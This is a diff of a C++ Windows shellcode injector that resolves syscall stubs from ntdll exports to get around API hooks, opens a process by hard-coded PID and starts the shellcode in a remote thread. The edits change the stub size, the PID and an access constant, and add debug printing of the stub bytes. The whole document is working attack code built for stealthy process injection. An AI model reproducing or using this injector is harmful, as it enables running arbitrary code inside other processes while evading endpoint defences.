@@ -13,7 +13,7 @@
 using namespace std;
 
 vector<BYTE> sc = SC::GetSC();
-int const SYSCALL_STUB_SIZE = 23;
+int const SYSCALL_STUB_SIZE = 21;
 tuple<BYTE*, DWORD> snarf = Convert::VectorToByteArray(sc);
 BYTE* shellcode = get<0>(snarf);
 DWORD dwShellcodeLength = get<1>(snarf);
@@ -60,11 +60,13 @@ BOOL GetStub(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOfFunct
 		PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
 
 		LPCSTR functionNameResolved = (LPCSTR)pczFunctionName;
-
 		if (std::strcmp(functionNameResolved, Syscall.c_str()) == 0)
 		{
 			std::memcpy(stub, (LPVOID)pFunctionAddress, SYSCALL_STUB_SIZE);
+
+
 			return TRUE;
+
 		}
 	}
 	return FALSE;
@@ -92,6 +94,13 @@ BOOL FindOpenProc(DWORD dwExports, PDWORD pdwAddressOfNames, PDWORD pdwAddressOf
 
 	if (!GetStub(dwExports, pdwAddressOfNames, pdwAddressOfFunctions, pwAddressOfNameOrdinales, dllBase, "NtOpenProcess", OpenProcStub))
 		return FALSE;
+
+	printf("\n");
+	for (int i = 0; i < sizeof(OpenProcStub); i++)
+	{
+		printf("0x%x ", OpenProcStub[i]);
+	}
+	printf("\n");
 
 	return TRUE;
 }
@@ -171,7 +180,7 @@ BOOL EstablishSyscalls()
 		//Make sure it is ntdll
 		if (_wcsnicmp(name.Buffer, L"ntdll.dll", 10) == 0)
 		{
-			printf("Found ntdll.dll!");
+			printf("Found ntdll.dll!\n");
 			break;
 		}
 	}
@@ -228,6 +237,8 @@ int main(int argc, char* argv[])
 	SIZE_T szAllocation = dwShellcodeLength;
 	DWORD oldProtect;
 
+
+
 	/*
 	if (argc < 2)
 	{
@@ -236,14 +247,12 @@ int main(int argc, char* argv[])
 
 	} */
 
+	DWORD targetPid = 14948;
+
 	if (!EstablishSyscalls())
 		return 1;
 
 	//DWORD targetPid = std::atoi(argv[1]);
-	DWORD targetPid = 16016;
-	BOOL localNtDll = TRUE;
-
-
 
 	printf("Opening target process with PID %d\n", targetPid);
 	hProc = CallOpenProc(targetPid);
@@ -277,7 +286,7 @@ int main(int argc, char* argv[])
 	}
 
 	printf("Creating remote thread\n");
-	status = _NtCreateThreadEx(&hRemoteThread, 0x1FFFFF, NULL, hProc,
+	status = _NtCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProc,
 		(LPTHREAD_START_ROUTINE)lpAllocationStart, NULL, FALSE, 0, 0, 0, NULL);
 
 
